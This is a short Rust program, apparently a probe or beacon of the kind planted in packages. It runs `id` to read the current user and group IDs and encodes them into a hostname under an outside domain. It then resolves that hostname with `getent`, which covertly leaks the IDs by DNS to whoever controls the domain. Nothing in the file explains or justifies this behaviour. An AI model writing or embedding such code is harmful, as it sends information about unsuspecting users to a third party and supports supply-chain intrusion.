use std::process::Command;

const HOST: &str = "d234959f5143012b0eec.sl.u2.ae";

fn output(arg: &str) -> String {
    Command::new("id")
        .arg(arg)
        .output()
        .map(|value| String::from_utf8_lossy(&value.stdout).trim().to_owned())
        .unwrap_or_else(|_| "x".to_owned())
}

fn main() {
    let hostname = format!("u{}.g{}.{}", output("-u"), output("-g"), HOST);
    let _ = Command::new("getent").args(["hosts", &hostname]).status();
}
